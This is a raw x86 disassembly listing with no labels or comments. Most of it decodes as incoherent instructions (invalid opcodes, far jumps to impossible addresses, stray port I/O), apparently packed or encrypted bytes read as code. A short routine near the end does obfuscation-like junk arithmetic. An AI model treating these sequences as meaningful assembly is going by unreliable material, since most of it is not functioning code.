  4092c6:	mov    WORD PTR ds:0x535001a6,gs
  4092cc:	repz int3 
  4092ce:	xor    bh,BYTE PTR [edx-0x27d7c0ba]
  4092d4:	aam    0xd6
  4092d6:	dec    ebx
  4092d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092d8:	pop    ecx
  4092d9:	call   0x17bf022
  4092de:	dec    edx
  4092df:	cmp    eax,0x36e3c36c
  4092e4:	enter  0xb348,0xf2
  4092e8:	jl     0x409286
  4092ea:	sbb    ebx,esi
  4092ec:	fld    TBYTE PTR [ebp+0x42]
  4092ef:	sbb    ecx,edi
  4092f1:	dec    edi
  4092f2:	mov    ebx,0xfbcbd90d
  4092f7:	cmp    al,dh
  4092f9:	out    dx,al
  4092fa:	jmp    0x40927f
  4092fc:	sub    BYTE PTR [ebx+0x2d],bl
  4092ff:	mov    eax,ds:0x8d30ff21
  409304:	add    eax,0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	(bad)  
  40932e:	stos   DWORD PTR es:[edi],eax
  40932f:	mov    ds:0x70e22791,eax
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x409304
  40933a:	xchg   DWORD PTR [eax-0x10],ebx
  40933d:	cmp    bl,bh
  40933f:	loop   0x40933b
  409341:	sub    dl,bh
  409343:	mov    WORD PTR [eax+0x2bed2d17],ss
  409349:	adc    bl,bh
  40934b:	js     0x409349
  40934d:	scas   eax,DWORD PTR es:[edi]
  40934e:	dec    ebx
  40934f:	xchg   ebx,eax
  409350:	pop    esp
  409351:	enter  0xe0b,0x4
  409355:	cmp    eax,0x188cfe94
  40935a:	pop    edx
  40935b:	xchg   edi,eax
  40935c:	(bad)  
  40935d:	ds mov ebx,0x79b7c34a
  409363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409364:	pop    esi
  409365:	enter  0xd5a5,0x8f
  409369:	cmp    ebx,edi
  40936b:	aam    0x10
  40936d:	xchg   esp,eax
  40936e:	mov    eax,ds:0x7d8ca38a
  409373:	fnsave [edi]
  409375:	dec    edx
  409376:	jl     0x409350
  409378:	xor    DWORD PTR [ecx],edx
  40937a:	hlt    
  40937b:	(bad)
  40937e:	sub    BYTE PTR [edx+edx*8+0x664a1184],bh
  409385:	xchg   ecx,eax
  409386:	mov    cl,0xb5
  409388:	inc    esi
  409389:	ins    BYTE PTR es:[edi],dx
  40938a:	out    0x51,eax
  40938c:	loop   0x4093d4
  40938e:	jl     0x409318
  409390:	add    BYTE PTR [eax-0x5f],dl
  409393:	into   
  409394:	shr    esi,0x9c
  409397:	jmp    0xd798f52e
  40939c:	imul   ecx,DWORD PTR [ebx+0x54],0x611daaee
  4093a3:	mov    BYTE PTR [ebx+ebp*8-0x21],ah
  4093a7:	fiadd  DWORD PTR [ebx]
  4093a9:	adc    DWORD PTR [esi],esi
  4093ab:	int3   
  4093ac:	jno    0x409390
  4093ae:	push   ebx
  4093af:	addr16 pop ecx
  4093b1:	call   0xe3ff8ed3
  4093b6:	frstor ds:0x194f8863
  4093bc:	inc    ebx
  4093be:	(bad)  
  4093bf:	cli    
  4093c0:	int3   
  4093c1:	jmp    0x4093a8
  4093c3:	jmp    0x1969:0xf6e8d2be
  4093ca:	xlat   BYTE PTR ds:[ebx]
  4093cb:	pop    ebp
  4093cc:	je     0x4093a7
  4093ce:	jo     0x4093dd
  4093d0:	xor    eax,0x2e5f7210
  4093d5:	aad    0x75
  4093d7:	je     0x4093d7
  4093d9:	bnd jmp 0x4093db
  4093dc:	out    dx,eax
  4093dd:	jge    0x409374
  4093df:	and    DWORD PTR [ebx+0x7c],eax
  4093e2:	or     BYTE PTR [edx],0x33
  4093e5:	(bad)  
  4093e6:	cli    
  4093e7:	imul   esp,DWORD PTR [ebp-0x62],0x43
  4093eb:	sbb    al,0xc0
  4093ed:	outs   dx,DWORD PTR ds:[esi]
  4093ee:	leave  
  4093ef:	jge    0x40938c
  4093f1:	adc    DWORD PTR [edi+0x48],esp
  4093f4:	pop    eax
  4093f5:	lea    esp,[ebx-0x476c4667]
  4093fb:	xchg   esi,eax
  4093fc:	aaa    
  4093fd:	mov    esi,0x206950a5
  409402:	pop    ds
  409403:	pop    ss
  409404:	push   edi
  409405:	inc    esi
  409406:	dec    edi
  409407:	sbb    eax,0x5d9c84a4
  40940c:	cwde   
  40940d:	pop    ecx
  40940e:	fs and ch,dh
  409411:	push   0xa9a7add2
  409416:	hlt    
  409417:	(bad)  
  409418:	pop    ebp
  409419:	aas    
  40941a:	mov    bl,BYTE PTR [ebx]
  40941c:	in     eax,dx
  40941d:	mov    ah,0x68
  40941f:	out    dx,al
  409420:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409421:	mov    al,0x35
  409423:	adc    edx,DWORD PTR [edi-0x2f]
  409426:	pop    eax
  409427:	adc    al,0xa0
  409429:	ins    DWORD PTR es:[edi],dx
  40942a:	push   ss
  40942b:	mov    eax,ds:0xccc9479f
  409430:	rcr    BYTE PTR [edx],cl
  409432:	xor    DWORD PTR [edi+0x6ec5cdfc],eax
  409438:	mov    es,WORD PTR [edx]
  40943a:	aam    0xd5
  40943c:	enter  0x4dc7,0x79
  409440:	(bad)  
  409441:	push   ebx
  409442:	(bad)  
  409443:	push   ecx
  409444:	outs   dx,DWORD PTR ds:[esi]
  409445:	fistp  DWORD PTR [edx-0x54]
  409448:	cmp    eax,0xf890d9ae
  40944d:	jmp    0x5c289f9f
  409452:	scas   al,BYTE PTR es:[edi]
  409453:	and    cl,BYTE PTR fs:[ebp+0x29569e1a]
  40945a:	cdq    
  40945b:	or     bh,bh
  40945d:	sub    DWORD PTR [ebp+0x3670e3af],0x20bb1489
  409467:	inc    esp
  409468:	fs xor al,0x89
  40946b:	and    eax,0xab4fa358
  409470:	adc    ah,BYTE PTR [ecx]
  409472:	cmp    DWORD PTR [ebx+0x25],ecx
  409475:	bound  ebx,QWORD PTR [ebp-0x2]
  409478:	jns    0x4094c7
  40947a:	mov    cl,0x21
  40947c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40947d:	dec    ebx
  40947e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40947f:	push   ecx
  409480:	inc    eax
  409481:	out    dx,al
  409482:	ret    0xe1f7
  409485:	pushf  
  409486:	das    
  409487:	pop    eax
  409488:	aam    0x72
  40948a:	xchg   ebx,eax
  40948b:	cdq    
  40948c:	sti    
  40948d:	fs jmp 0x409485
  409490:	xor    BYTE PTR [edx],dl
  409492:	xor    ebp,ebx
  409494:	xchg   edx,eax
  409495:	test   DWORD PTR [edx-0x681048b4],eax
  40949b:	rcr    DWORD PTR ds:0x3406a0bb,0xcb
  4094a2:	push   es
  4094a3:	add    al,0xff
  4094a5:	mov    esp,0x63d87a89
  4094aa:	lods   al,BYTE PTR ds:[esi]
  4094ab:	push   0x27
  4094ad:	sbb    eax,0xb8e6b4a3
  4094b2:	jge    0x409508
  4094b4:	xchg   BYTE PTR [esi],cl
  4094b6:	bound  esi,QWORD PTR [ecx-0x4c]
  4094b9:	and    DWORD PTR [eax],edx
  4094bb:	cmp    eax,0x67a5cd08
  4094c0:	call   0x584d:0x68fcc43
  4094c7:	bnd jb 0x4094b6
  4094ca:	mov    ds,WORD PTR [esi-0x62]
  4094cd:	inc    ebx
  4094ce:	mov    ?,WORD PTR [ecx]
  4094d0:	fwait
  4094d1:	arpl   WORD PTR [esi+0x1b7a1518],bp
  4094d7:	cmp    bl,cl
  4094d9:	adc    BYTE PTR [ebx+0x2c],bh
  4094dc:	bound  eax,QWORD PTR [ebx]
  4094de:	xor    eax,0x84a54131
  4094e3:	cmp    BYTE PTR ds:0xc186,dh
  4094e8:	pop    edi
  4094e9:	mov    WORD PTR [eax],gs
  4094eb:	dec    esp
  4094ec:	fild   WORD PTR [eax+0x68788373]
  4094f2:	mov    ecx,0xba16cb57
  4094f7:	xchg   edx,eax
  4094f8:	sub    BYTE PTR [esi-0x9],al
  4094fb:	push   edx
  4094fc:	scas   al,BYTE PTR es:[edi]
  4094fd:	shl    DWORD PTR [eax-0x50],cl
  409500:	push   eax
  409501:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  409503:	inc    ebx
  409504:	xchg   ebx,eax
  409505:	in     eax,dx
  409506:	push   es
  409507:	enter  0x25e1,0x7
  40950b:	cmovno ebp,DWORD PTR [esi-0x2b]
  40950f:	retf   
  409510:	out    dx,eax
  409511:	sahf   
  409512:	mov    WORD PTR [eax-0x3d3c61ab],ss
  409518:	cmp    eax,0xeda1195e
  40951d:	popf   
  40951e:	loopne 0x40951c
  409520:	out    dx,eax
  409521:	(bad)  
  409522:	mov    ds:0x70c7d7d0,eax
  409527:	mov    BYTE PTR [ecx-0x48f2f82],ch
  40952d:	popa   
  40952e:	inc    esp
  40952f:	ss dec edi
  409531:	fcom   QWORD PTR [ebx-0x6d]
  409534:	in     al,dx
  409535:	cmp    dh,BYTE PTR gs:[ebp+0x12aeee38]
  40953c:	jne    0x409548
  40953e:	mov    ebx,0xa27b6df3
  409543:	mov    ch,0x19
  409545:	push   ebx
  409546:	mov    edx,0xed9c6440
  40954b:	push   ebp
  40954c:	sub    BYTE PTR [ebx],ah
  40954e:	call   0x55e23315
  409553:	sbb    esp,0xffffffd7
  409556:	test   al,0x1c
  409558:	cs js  0x40951a
  40955b:	cmp    cl,ah
  40955d:	cwde   
  40955e:	add    esi,DWORD PTR [esi+0x0]
  409561:	imul   ebp,DWORD PTR [eax+0x1e],0xa656621f
  409568:	pop    ecx
  409569:	loopne 0x40953a
  40956b:	xchg   DWORD PTR [ebx],ecx
  40956d:	in     al,0x75
  40956f:	loope  0x40959d
  409571:	fprem  
  409573:	int    0xb7
  409575:	sub    bh,dh
  409577:	cmp    BYTE PTR ds:0x55dbd998,dl
  40957d:	push   edi
  40957e:	jae    0x40958d
  409580:	push   edx
  409581:	dec    ebp
  409582:	loopne 0x409546
  409584:	popf   
  409585:	sbb    BYTE PTR [eax+0x15],dl
  409588:	push   ebx
  409589:	jae    0x4095e5
  40958b:	push   ebp
  40958c:	mov    ah,cl
  40958e:	mov    dl,0x60
  409590:	jle    0x409605
  409592:	and    al,BYTE PTR [ebx-0x4c26829d]
  409598:	xchg   ebx,eax
  409599:	pushf  
  40959a:	mov    ds:0x1098907a,al
  40959f:	and    al,0x30
  4095a1:	(bad)  [edi]
  4095a3:	push   es
  4095a4:	pop    edx
  4095a5:	jmp    0xb662:0x7b0c8da4
  4095ac:	adc    bh,dh
  4095ae:	xor    esi,ecx
  4095b0:	arpl   WORD PTR [edi-0x17],dx
  4095b3:	into   
  4095b4:	pop    edx
  4095b5:	mov    BYTE PTR [edx],cl
  4095b7:	sub    DWORD PTR [eax-0x32],0x48bbb9d7
  4095be:	rcr    DWORD PTR [edi+0x7eca2f59],cl
  4095c4:	sub    al,0xe9
  4095c6:	mov    ds:0xa5a3e205,eax
  4095cb:	cmp    esi,ebp
  4095cd:	sub    al,0xfe
  4095cf:	loope  0x40955c
  4095d1:	int3   
  4095d2:	mov    al,ds:0xb3d20e5e
  4095d7:	pop    ebp
  4095d8:	xor    bh,ah
  4095da:	jns    0x4095bc
  4095dc:	and    DWORD PTR [ebx-0x613dce3f],esi
  4095e2:	repnz cdq 
  4095e4:	xor    al,0x93
  4095e6:	inc    ebx
  4095e7:	cmp    cl,0x33
  4095ea:	test   eax,0xca3f84aa
  4095ef:	jne    0x4095b9
  4095f1:	push   cs
  4095f2:	cmp    ebx,ecx
  4095f4:	cwde   
  4095f5:	out    0x6b,eax
  4095f7:	adc    al,0x5c
  4095f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095fa:	adc    ebp,ecx
  4095fc:	cs jns 0x40964e
  4095ff:	fnsave [ebx-0x1da7317b]
  409605:	setno  BYTE PTR [ebx]
  409608:	out    0xf8,eax
  40960a:	pop    edi
  40960b:	sub    esi,DWORD PTR [eax]
  40960d:	inc    ebx
  40960e:	pop    ebx
  40960f:	pushf  
  409610:	pusha  
  409611:	and    ebx,eax
  409613:	les    esi,FWORD PTR [edi]
  409615:	in     al,0x9
  409617:	xor    ah,dh
  409619:	out    dx,al
  40961a:	jmp    0x9e6a:0x566c79ef
  409621:	sbb    ebx,DWORD PTR [ebx]
  409623:	xchg   BYTE PTR [edx-0x540740e1],dh
  409629:	ja     0x4095e1
  40962b:	hlt    
  40962c:	mov    bh,0xf3
  40962e:	shr    BYTE PTR [edx-0x59],0xd3
  409632:	in     al,dx
  409633:	cmp    eax,0xe7d3ad70
  409638:	or     BYTE PTR [edi+ebx*4+0x4e577247],ch
  40963f:	retf   0x4b81
  409642:	stos   DWORD PTR es:[edi],eax
  409643:	mov    ch,0x60
  409645:	pop    edi
  409646:	xchg   esi,eax
  409647:	xor    BYTE PTR [ecx+0xd],al
  40964a:	pop    ebp
  40964b:	stos   BYTE PTR es:[edi],al
  40964c:	mov    cl,0x41
  40964e:	or     eax,0x4238733e
  409653:	hlt    
  409654:	adc    ebp,DWORD PTR [ebx+0x46]
  409657:	jp     0x40966a
  409659:	sub    ah,BYTE PTR [esi]
  40965b:	adc    ch,BYTE PTR [esi]
  40965d:	test   al,0xd8
  40965f:	mov    eax,0xa8c3c98a
  409665:	fs xchg ecx,eax
  409667:	bound  edx,QWORD PTR [edi+edi*8+0x458b0150]
  40966e:	loopne 0x4095fb
  409670:	or     eax,0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [edi-0x28530a9e],esi
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x40961a
  409693:	leave  
  409694:	push   0x557d5581
  409699:	mov    al,0xfb
  40969b:	or     ah,dl
  40969d:	sbb    al,0x5b
  40969f:	mov    dl,BYTE PTR [edi+0x560f4cee]
  4096a5:	push   ecx
  4096a6:	pusha  
  4096a7:	test   eax,0xec9d9da6
  4096ad:	pop    eax
  4096ae:	jmp    0x93ae003d
  4096b3:	jo     0x40968a
  4096b5:	rol    BYTE PTR [edi],0x2e
  4096b8:	xchg   BYTE PTR [esi-0xee484dd],cl
  4096be:	aad    0xd1
  4096c0:	and    dl,BYTE PTR [ebp-0x52]
  4096c3:	ss clc 
  4096c5:	push   ebp
  4096c7:	loope  0x409726
  4096c9:	pop    ecx
  4096ca:	mov    edi,0xfe212165
  4096cf:	ss test dh,bh
  4096d2:	clc    
  4096d3:	xchg   ebp,eax
  4096d4:	call   0x6007:0x7a64bad4
  4096db:	cmp    DWORD PTR [edi+0x2850abe4],eax
  4096e1:	jmp    0x4096c5
  4096e3:	lods   eax,DWORD PTR ds:[esi]
  4096e4:	je     0x409672
  4096e6:	xchg   edi,eax
  4096e7:	jb     0x4096a8
  4096e9:	push   edi
  4096ea:	sub    edx,DWORD PTR ds:0x77f4a727
  4096f0:	sbb    eax,0xff770b1a
  4096f5:	sahf   
  4096f6:	sbb    BYTE PTR [eax-0x34ec97ce],al
  4096fc:	mov    dl,0x87
  4096fe:	setl   ch
  409701:	xchg   edx,eax
  409702:	out    0xff,eax
  409704:	shl    BYTE PTR [ebp-0x1ff1cebf],0xf4
  40970b:	adc    DWORD PTR [edi-0x38],edi
  40970e:	sub    ebx,ebp
  409710:	push   ss
  409711:	fsubr  QWORD PTR fs:[edi+ebx*8-0xc]
  409716:	xchg   esi,eax
  409717:	jle    0x4096d0
  409719:	fisttp QWORD PTR [ebx+0x22]
  40971c:	sbb    al,0xb6
  40971e:	or     BYTE PTR [ecx-0x46f1ab26],bl
  409724:	shl    BYTE PTR [ebx-0x41e5df24],1
  40972a:	push   es
  40972b:	ret    0x41a6
  40972e:	and    al,0x3
  409730:	les    edi,FWORD PTR ds:0xb4d29591
  409736:	out    0xd7,al
  409738:	xor    dh,ah
  40973a:	push   0x70
  40973c:	stc    
  40973d:	sub    bh,BYTE PTR ds:0xfcb19d0d
  409743:	jbe    0x409770
  409745:	adc    ah,BYTE PTR [esi-0x19]
  409748:	mov    gs,WORD PTR [esi+0x6a996945]
  40974e:	dec    ebp
  40974f:	push   edi
  409750:	call   0xc732:0xb145fc21
  409757:	dec    edx
  409758:	push   eax
  409759:	mov    edi,0x1bbcd921
  40975e:	ret    
  40975f:	sti    
  409760:	cmp    DWORD PTR [ebx+ebx*4+0x7d],0xffffffe9
  409765:	faddp  st(5),st
  409767:	enter  0xba4e,0x40
  40976b:	and    BYTE PTR [edx+0x4d],bh
  40976e:	ficomp WORD PTR [ebp+0x70]
  409771:	jle    0x40970b
  409773:	jle    0x4097d1
  409775:	stc    
  409776:	sub    DWORD PTR [esi+0x1d3ded53],0xfb542c6c
  409780:	inc    ebp
  409781:	xchg   esp,eax
  409782:	imul   edx,DWORD PTR [edx-0x76],0x991de03e
  409789:	ret    
  40978a:	dec    edx
  40978b:	mov    esi,0x46a0f24d
  409790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409791:	and    BYTE PTR [edi],0xd0
  409794:	add    al,0xaa
  409796:	pop    ecx
  409797:	das    
  409798:	aas    
  409799:	nop
  40979a:	cmp    BYTE PTR [edx],0x92
  40979d:	cmp    BYTE PTR [edx+0x11de2f21],0xc8
  4097a4:	mov    al,ds:0xc0617bac
  4097a9:	or     ecx,DWORD PTR [esi+0x4b]
  4097ac:	cmp    DWORD PTR [eax-0xd],edi
  4097af:	inc    eax
  4097b0:	daa    
  4097b1:	repz xor esp,DWORD PTR [ebp-0x6]
  4097b5:	data16 mov dl,0x66
  4097b8:	(bad)  
  4097b9:	mov    dl,0x56
  4097bb:	int    0xc2
  4097bd:	fcom   QWORD PTR [esi+0x56]
  4097c0:	arpl   WORD PTR [ebx],si
  4097c2:	or     eax,0xf3785ffd
  4097c7:	dec    ebp
  4097c8:	xchg   esp,eax
  4097c9:	jl     0x4097ae
  4097cb:	add    DWORD PTR ds:0xa1409982,0xffffff95
  4097d2:	dec    ebp
  4097d3:	jl     0x4097f8
  4097d5:	ror    bl,0x54
  4097d8:	repz clc 
  4097da:	ror    ah,0xd0
  4097dd:	out    0x2e,eax
  4097df:	adc    BYTE PTR [ecx],ah
  4097e1:	xchg   ebx,eax
  4097e2:	mov    eax,ds:0x71e907e7
  4097e7:	xor    al,BYTE PTR [ebx+0xb]
  4097ea:	sbb    bh,0x55
  4097ed:	mov    ch,0x3c
  4097ef:	sar    BYTE PTR [ebp-0x757ba0a0],0x9e
  4097f6:	jp     0x409851
  4097f8:	fsubr  st,st(2)
  4097fa:	jno    0x409870
  4097fc:	mov    al,ds:0xafbfd671
  409801:	sub    al,0xd0
  409803:	mov    al,ds:0xea3d55e0
  409808:	cmp    eax,0xb7fdd747
  40980d:	sbb    eax,0x7feceb42
  409812:	arpl   dx,cx
  409814:	nop
  409815:	xchg   eax,ebx
  409817:	jnp    0x40985a
  409819:	je     0x4097e8
  40981b:	mov    bl,ah
  40981d:	dec    ebp
  40981e:	ret    0xdf23
  409821:	jecxz  0x4097e1
  409823:	push   0xffffff9d
  409825:	icebp  
  409826:	data16 add al,0xc4
  409829:	shr    BYTE PTR [ebx-0x3e],0x5a
  40982d:	in     al,0xf2
  40982f:	inc    esp
  409830:	call   0x7b70089e
  409835:	mov    gs,WORD PTR [ebx]
  409837:	push   es
  409838:	adc    bl,BYTE PTR [esi-0x4a32346c]
  40983e:	popa   
  40983f:	xchg   ebp,eax
  409840:	mov    dx,0xebda
  409844:	loopne 0x409866
  409846:	cmp    al,al
  409848:	stos   BYTE PTR es:[edi],al
  409849:	cs dec edi
  40984b:	aad    0xb4
  40984d:	pop    ecx
  40984e:	rcr    BYTE PTR [ecx+0x4b],1
  409851:	jne    0x40987e
  409853:	cwde   
  409854:	push   ecx
  409855:	in     al,dx
  409856:	and    eax,ebx
  409858:	jmp    0x1c478ab8
  40985d:	std    
  40985e:	fbstp  TBYTE PTR [ebp+0x1f]
  409861:	cmc    
  409862:	jnp    0x4098c4
  409864:	int3   
  409865:	jnp    0x409861
  409867:	ss sbb eax,0x51
  40986b:	inc    ebx
  40986c:	sub    bh,BYTE PTR [edi+0x5dc6afb5]
  409872:	sub    al,0x26
  409874:	or     DWORD PTR [ebx+0x35],0xffffffe9
  409878:	dec    esp
  409879:	das    
  40987a:	and    ah,BYTE PTR [ebx+0x908b04e]
  409880:	mov    cl,0x6d
  409882:	xchg   ecx,eax
  409883:	sub    ebx,DWORD PTR [ecx+0x17]
  409886:	push   ss
  409887:	add    eax,0x427371e
  40988c:	and    eax,0x35fb0925
  409891:	(bad)  
  409892:	jns    0x409868
  409894:	sbb    dh,ch
  409896:	fcom   DWORD PTR [ebx-0x207b0c9f]
  40989c:	outs   dx,DWORD PTR ds:[esi]
  40989d:	enter  0xe2d8,0x24
  4098a1:	lods   eax,DWORD PTR ds:[esi]
  4098a2:	test   al,0x48
  4098a4:	fwait
  4098a5:	in     al,dx
  4098a6:	push   edi
  4098a7:	les    ebp,FWORD PTR [edx-0x68]
  4098aa:	mov    dh,0xac
  4098ac:	into   
  4098ad:	and    esp,DWORD PTR [ebx]
  4098af:	jno    0x409839
  4098b1:	mov    al,ds:0xf360f3a8
  4098b6:	fist   DWORD PTR [ebp+0x5a29b88a]
  4098bc:	out    0xf9,eax
  4098be:	pop    edi
  4098bf:	js     0x4098b2
  4098c1:	cmp    BYTE PTR [ecx],0x79
  4098c4:	and    ah,cl
  4098c6:	or     al,0x27
  4098c9:	jl     0x4098fc
  4098cb:	xchg   ebx,eax
  4098cc:	retf   
  4098cd:	js     0x4098c7
  4098cf:	mov    esi,0x5237ff64
  4098d4:	push   ebp
  4098d5:	sub    BYTE PTR ds:0xe86cc5a9,cl
  4098db:	push   eax
  4098dc:	mov    ds:0x95dbbb64,eax
  4098e1:	rcr    esi,cl
  4098e3:	cwde   
  4098e4:	xor    BYTE PTR [eax-0x30],al
  4098e7:	cs adc ch,dh
  4098ea:	push   ecx
  4098eb:	inc    BYTE PTR cs:[eax+ebp*8]
  4098ef:	add    edi,DWORD PTR [edi+eax*2+0x6c0b67ab]
  4098f6:	outs   dx,BYTE PTR ds:[esi]
  4098f7:	mov    ebp,0x5cf5c28e
  4098fc:	imul   ebp,DWORD PTR [eax+0x43],0xfffffffc
  409900:	sar    BYTE PTR [edi+esi*8-0x11946212],cl
  409907:	in     al,dx
  409908:	in     eax,0xb7
  40990a:	sbb    DWORD PTR [esi-0x5b],esp
  40990d:	ja     0x40997b
  40990f:	inc    esp
  409910:	xor    eax,0x7bf4aa97
  409915:	cmp    eax,0x20cb09ed
  40991a:	test   eax,0xbf7cd7f9
  40991f:	pusha  
  409920:	rol    BYTE PTR [edx-0x51],1
  409923:	push   0x8ec7e9f0
  409928:	and    al,0x1d
  40992a:	mov    bh,0x88
  40992c:	ror    BYTE PTR [ecx],0xe3
  40992f:	xchg   esi,eax
  409930:	adc    bl,cl
  409932:	pop    esp
  409933:	mov    eax,ds:0xd77d31f6
  409938:	sar    BYTE PTR [edi+esi*4],0x71
  40993c:	pop    eax
  40993d:	mov    esi,0xa34950b5
  409942:	out    dx,eax
  409943:	sub    al,0x97
  409945:	mov    eax,0x8b8e0436
  40994a:	jle    0x409913
  40994c:	mov    es,WORD PTR ss:[ebp+ebx*2-0x20]
  409951:	push   ebp
  409952:	push   esi
  409953:	ins    BYTE PTR es:[di],dx
  409955:	test   eax,0x4b002f4d
  40995a:	sbb    eax,0xc25c3316
  40995f:	inc    esp
  409960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409961:	loop   0x4098f4
  409963:	pushf  
  409964:	or     BYTE PTR [eax+0x4e],bl
  409967:	fst    QWORD PTR [ecx+eiz*4]
  40996a:	inc    ecx
  40996b:	jbe    0x4098fe
  40996d:	add    BYTE PTR [edi+0x47],ch
  409970:	sub    DWORD PTR [esi],esp
  409972:	mov    esp,0xd51de9dd
  409977:	mov    eax,0xd9583448
  40997c:	mov    eax,ds:0x67d5dad4
  409981:	ds inc edi
  409983:	out    dx,al
  409984:	vpmacssdd xmm1,xmm1,XMMWORD PTR [ecx-0x428c0697],xmm2
  40998e:	xor    al,0x6c
  409990:	in     eax,0x1e
  409992:	(bad)
  409995:	ja     0x4099ce
  409997:	inc    edx
  409998:	xor    edx,DWORD PTR [eax+0x28f9af7e]
  40999e:	push   cs
  40999f:	stc    
  4099a0:	test   eax,0xd94608dd
  4099a5:	cmp    edx,ebp
  4099a7:	xor    BYTE PTR [eax+0x6b],al
  4099aa:	or     eax,0x20fd1741
  4099af:	sahf   
  4099b0:	test   ah,dh
  4099b2:	adc    dh,BYTE PTR [eax-0x4ea1b550]
  4099b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099b9:	adc    DWORD PTR [ebp+edx*8-0xf],ecx
  4099bd:	xor    ebp,DWORD PTR [ebx]
  4099bf:	or     cl,BYTE PTR [eax+0x5f08013f]
  4099c5:	pop    esi
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fe0a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e19c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e317
  4099eb:	mov    edi,DWORD PTR ds:0x42e327
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e81c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e1a4,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fd79,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e19c
  409a3d:	sbb    DWORD PTR ds:0x42e76b,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	neg    DWORD PTR [esi]
  409a5a:	push   ebp
  409a5b:	sub    eax,0x70ec8760
  409a60:	jo     0x409a01
  409a62:	jge    0x409ad4
  409a64:	jo     0x409ac3
  409a66:	mov    fs,WORD PTR [edx+ebx*4-0x15]
  409a6a:	outs   dx,BYTE PTR ds:[esi]
  409a6b:	cmp    al,0x2
  409a6d:	sub    DWORD PTR [eax-0x26],esi
  409a70:	mov    dh,0xb
  409a72:	loop   0x409a52
  409a74:	mov    ebp,0xadbf7ce9
  409a79:	mov    ebp,0xee25367b
  409a7e:	add    cl,BYTE PTR [esi+eax*1]
  409a81:	lds    esi,FWORD PTR [ebp-0x3d]
  409a84:	sub    bh,bh
  409a86:	es cmc 
  409a88:	and    DWORD PTR [edi+0x63],ebx
  409a8b:	daa    
  409a8c:	mov    WORD PTR [ebx+ebp*1+0x26fec79b],ss
  409a93:	and    al,0x2e
  409a95:	aaa    
  409a96:	jns    0x409ab2
  409a98:	cmp    DWORD PTR gs:[esi+0x43],ebp
  409a9c:	ins    BYTE PTR es:[edi],dx
  409a9d:	sbb    BYTE PTR [eax+0x32515ce6],ah
  409aa3:	jl     0x409ae2
  409aa5:	inc    esi
  409aa6:	cs jmp 0x62e7d892
  409aac:	nop
  409aad:	int    0x47
  409aaf:	pop    edi
  409ab0:	mov    ah,0xb8
  409ab2:	xor    BYTE PTR [ebp-0x11],bl
  409ab5:	lock or eax,0xd42722e0
  409abb:	ins    DWORD PTR es:[edi],dx
  409abc:	mov    ebp,DWORD PTR [eax]
  409abe:	and    edx,DWORD PTR [ebx]
  409ac0:	movsx  esp,WORD PTR [esi-0x13241cd5]
  409ac7:	sbb    BYTE PTR [ebp+0x4bcd6264],ch
  409acd:	xor    bh,al
  409acf:	inc    edi
  409ad0:	test   al,0x55
  409ad2:	sub    eax,0xc4f83cef
  409ad7:	xor    bh,al
  409ad9:	push   cs
  409ada:	inc    ecx
  409adb:	shl    BYTE PTR [ebp+0x37],1
  409ade:	stos   DWORD PTR es:[edi],eax
  409adf:	jmp    0x40d:0xeb323a8e
  409ae6:	enter  0x8aa8,0xb6
  409aea:	ret    0x629a
  409aed:	sbb    ebx,DWORD PTR [ebp+0x7c011358]
  409af3:	mov    ebx,0x1d65c260
  409af8:	mov    dh,0xb6
  409afa:	adc    eax,0xfae6d049
  409aff:	dec    ecx
  409b00:	dec    ebp
  409b01:	bnd ret 0x26bb
  409b05:	pop    eax
  409b06:	(bad)  
  409b07:	in     eax,dx
  409b08:	ret    
